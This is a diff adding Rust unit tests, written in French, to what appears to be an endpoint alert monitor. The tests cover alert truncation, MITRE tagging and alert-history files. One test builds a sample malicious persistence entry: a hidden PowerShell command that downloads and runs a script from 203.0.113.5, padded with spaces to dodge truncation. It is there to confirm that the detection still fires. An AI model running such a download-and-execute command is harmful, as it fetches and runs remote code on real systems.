@@ -3009,7 +3009,7 @@ fn phase3_alerte_bornee() {
     let octets = serde_json::to_vec(&a).unwrap().len();
     assert!(octets < 16 * 1024, "alerte bornée de {octets} octets");
     assert!(octets * 1000 < TAILLE_MAX_ALERTES as usize);
-    assert_eq!(a.raisons.chars().count(), MAX_RAISONS_ALERTE + 1, "1000 caractères puis « … »");
+    assert_eq!(a.raisons.chars().count(), MAX_RAISONS_ALERTE + 3, "500 premiers, « … », 500 derniers");
     assert!(!a.raisons.chars().any(|c| c.is_control()));
     // Alerte ordinaire inchangée
     let mut b = Alerte { raisons: "connexion vers 203.0.113.9".into(), chemin: r"C:\x.exe".into(), ..Default::default() };
@@ -3017,9 +3017,40 @@ fn phase3_alerte_bornee() {
     assert!(b.raisons == "connexion vers 203.0.113.9" && b.chemin == r"C:\x.exe");
     let source = include_str!("moniteur.rs");
     let debut = source.find("fn ajouter_alerte_brute").unwrap();
-    assert!(source[debut..debut + 300].contains("commun::borner_alerte(&mut a)"), "bornage absent d'ajouter_alerte_brute");
+    let corps = &source[debut..debut + 600];
+    let (b, f) = (corps.find("commun::borner_alerte(&mut a)").expect("bornage absent"), corps.find("apprentissage::filtrer(&mut a)").expect("filtrer"));
+    assert!(corps.find("mitre::enrichir(&mut a)").unwrap() < b && f < b, "bornage avant les décisions sur le texte entier (S72-06)");
     let e = source.find("fn ecrire_alertes").unwrap();
     assert!(source[e..e + 600].contains("commun::ecriture_alertes_permise()"), "écriture d'alertes.json non retenue");
+}
+
+/// Audit de sécurité de #72, S72-06 : une persistance malveillante rallongée (motif après 1100 espaces) garde son signal
+/// fort et sa technique MITRE, décidés sur le texte entier ; le bornage garde la remarque finale visible
+#[test]
+fn phase3_bornage_garde_la_conclusion() {
+    use crate::commun::{borner_alerte, Alerte};
+    let commande = format!("powershell.exe{}-w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')", " ".repeat(1100));
+    let remarque = crate::processus::suspicion(&commande).expect("motif PowerShell");
+    let mut a = Alerte { niveau: "Alerte".into(), score: 3, raisons: format!("NOUVEAU démarrage automatique : {commande} [{remarque}]"), ..Default::default() };
+    crate::mitre::enrichir(&mut a);
+    assert!(crate::apprentissage::signal_fort(&a), "témoin : signal fort sur le texte entier");
+    let mitre = a.mitre.clone();
+    assert!(mitre.contains("T1059.001"), "témoin : technique PowerShell ({mitre})");
+    borner_alerte(&mut a);
+    assert!(a.raisons.contains(remarque), "remarque coupée par le bornage : {}", a.raisons);
+    assert_eq!(a.mitre, mitre);
+}
+
+/// Relecture de #72, D7 : un fichier mis de côté compte comme historique (pas de nouvel apprentissage)
+#[test]
+fn phase3_historique_mis_de_cote_compte() {
+    use crate::commun::historique_alertes_existe;
+    let n = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
+    assert!(historique_alertes_existe(&n(&["config.json", "alertes.json"])));
+    assert!(historique_alertes_existe(&n(&["alertes-trop-grand-20261025120000.json"])));
+    assert!(historique_alertes_existe(&n(&["Alertes-illisible-20261025120000-1.JSON"])));
+    assert!(!historique_alertes_existe(&n(&["config.json", "apprentissage.json", "alertes.json.tmp", "incidents.json"])));
+    assert!(include_str!("apprentissage.rs").contains("commun::historique_alertes_existe(&commun::noms_du_dossier())"));
 }
 
 /// Phase 3.1 : une alerte d'un modèle plus récent (retour arrière) se lit, ses champs inconnus sont ignorés
